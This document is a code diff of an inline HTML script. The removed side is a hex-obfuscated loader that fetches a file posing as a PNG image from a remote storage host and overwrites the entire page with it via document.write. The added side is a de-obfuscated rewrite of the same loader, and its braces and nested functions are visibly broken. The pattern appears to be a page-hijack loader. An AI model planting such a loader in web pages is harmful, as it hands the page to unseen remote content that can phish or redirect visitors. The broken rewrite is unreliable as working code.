@@ -1,51 +1,51 @@
-<script>(function(){
-var JUaocoj1 = null
-var ajax = new XMLHttpRequest()
-var qvvqM3 = GetQueryString("\x63\x69")
-function render() {
-  var lJ4 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6f\x70\x65\x6e"](
-    "\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b \x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38",
-    "\x72\x65\x70\x6c\x61\x63\x65",
-  )
-  console.log("render-lJ4", lJ4)
-  console.log("render-JUaocoj1", JUaocoj1)
-  lJ4["\x77\x72\x69\x74\x65"](JUaocoj1)
-  lJ4["\x63\x6c\x6f\x73\x65"]()
-}
-ajax["\x6f\x6e\x6c\x6f\x61\x64"] = function () {
-  JUaocoj1 = ajax["\x72\x65\x73\x70\x6f\x6e\x73\x65\x54\x65\x78\x74"]
-  console.log("ajax-JUaocoj1", JUaocoj1)
-  var Nq5 = 0
-  if (Nq5 > 0) setTimeout("\x72\x65\x6e\x64\x65\x72\x28\x29", Nq5 * 1000)
-  else render()
-}
-function GetQueryString(oLJwQZZ6) {
-  var sq7 = /(^|&)ci=([^&]*)(&|$)/
-  var zVs8 = window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"][
-    "\x73\x65\x61\x72\x63\x68"
-  ]
-    ["\x73\x75\x62\x73\x74\x72"](1)
-    ["\x6d\x61\x74\x63\x68"](sq7)
-  console.log("GetQueryString-zVs8", zVs8)
-  console.log("GetQueryString-return", window["\x75\x6e\x65\x73\x63\x61\x70\x65"](zVs8[2]))
-  if (zVs8 != null) return window["\x75\x6e\x65\x73\x63\x61\x70\x65"](zVs8[2])
-  return null
-}
-if (qvvqM3 == 0) {
-  ajax["\x6f\x70\x65\x6e"](
-    "\x47\x45\x54",
-    "\x2f\x2f\x73\x74\x6f\x72\x61\x67\x65\x2e\x33\x36\x30\x62\x75\x79\x69\x6d\x67\x2e\x63\x6f\x6d\x2f\x70\x75\x62\x6c\x69\x63\x2e\x77\x65\x63\x68\x61\x74\x2e\x72\x65\x73\x75\x6d\x65\x2f\x32\x30\x32\x33\x30\x33\x32\x35\x30\x38\x34\x39\x30\x35\x32\x64\x65\x34\x66\x31\x39\x36\x2d\x32\x35\x30\x30\x2d\x34\x65\x65\x33\x2d\x61\x35\x37\x37\x2d\x62\x30\x38\x33\x66\x62\x61\x34\x61\x33\x35\x35\x2e\x70\x6e\x67\x3f\x74\x3d" +
-      window["\x44\x61\x74\x65"]["\x6e\x6f\x77"](),
-    !0,
-  )
-  ajax["\x73\x65\x6e\x64"]()
-} else {
-  ajax["\x6f\x70\x65\x6e"](
-    "\x47\x45\x54",
-    "\x2f\x2f\x73\x74\x6f\x72\x61\x67\x65\x2e\x33\x36\x30\x62\x75\x79\x69\x6d\x67\x2e\x63\x6f\x6d\x2f\x70\x75\x62\x6c\x69\x63\x2e\x77\x65\x63\x68\x61\x74\x2e\x72\x65\x73\x75\x6d\x65\x2f\x32\x30\x32\x33\x30\x33\x32\x35\x30\x38\x34\x39\x30\x35\x32\x64\x65\x34\x66\x31\x39\x36\x2d\x32\x35\x30\x30\x2d\x34\x65\x65\x33\x2d\x61\x35\x37\x37\x2d\x62\x30\x38\x33\x66\x62\x61\x34\x61\x33\x35\x35\x2e\x70\x6e\x67\x3f\x74\x3d" +
-      window["\x44\x61\x74\x65"]["\x6e\x6f\x77"](),
-    !0,
-  )
-  ajax["\x73\x65\x6e\x64"]()
-}
-})();</script>
+<script>
+  (function(){
+      var JUaocoj1 = null
+      var ajax = new XMLHttpRequest()
+      var qvvqM3 = GetQueryString("\x63\x69")
+      function render() {
+    var responseText = null
+    var request = new XMLHttpRequest()
+    var queryStr = GetQueryString()
+
+    function render() {
+        var dom = window['document']['open'](
+            'text/html; charset=utf-8',
+            'replace',
+        )
+        dom['write'](responseText)
+        dom['close']()
+    }
+    request['onload'] = function() {
+        responseText = request['responseText']
+        var Nq5 = 0
+        if (Nq5 > 0) setTimeout('render()', Nq5 * 1000)
+        else render()
+    }
+
+    function GetQueryString() {
+        var reg = /(^|&)ci=([^&]*)(&|$)/
+        var zVs8 = window['location'][
+                'search'
+            ]
+            ['substr'](1)['match'](reg)
+        if (zVs8 != null) return window['unescape'](zVs8[2])
+        return null
+    }
+    if (queryStr == 0) {
+        request['open'](
+            'GET',
+            '//storage.360buyimg.com/public.wechat.resume/202303250849052de4f196-2500-4ee3-a577-b083fba4a355.png?t=' +
+            window['Date']['now'](), !0,
+        )
+        request['send']()
+    } else {
+        request['open'](
+            'GET',
+            '//storage.360buyimg.com/public.wechat.resume/202303250849052de4f196-2500-4ee3-a577-b083fba4a355.png?t=' +
+            window['Date']['now'](), !0,
+        )
+        request['send']()
+    }
+  })();
+</script>
